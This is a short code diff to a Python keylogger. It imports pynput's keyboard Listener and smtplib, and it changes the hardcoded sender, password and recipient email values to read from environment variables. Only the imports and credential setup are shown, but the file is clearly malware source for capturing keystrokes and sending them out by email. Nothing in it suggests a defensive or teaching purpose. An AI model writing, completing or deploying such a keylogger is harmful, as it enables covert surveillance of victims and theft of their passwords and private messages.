@@ -1,12 +1,12 @@
 from pynput.keyboard import Key, Listener
-import logging, smtplib, time, datetime, threading
+import logging, smtplib, time, datetime, threading, os
 from threading import Thread
 
 def func1():
     global message
-    email = 'your_email.com'
-    password = 'your_password'
-    send_to_email = 'target_email.com'
+    email = os.environ.get('EMAIL_NAME')
+    password = os.environ.get('EMAIL_PASS')
+    send_to_email = os.environ.get('EMAIL_NAME')
     message = []
 
     session_exit = False
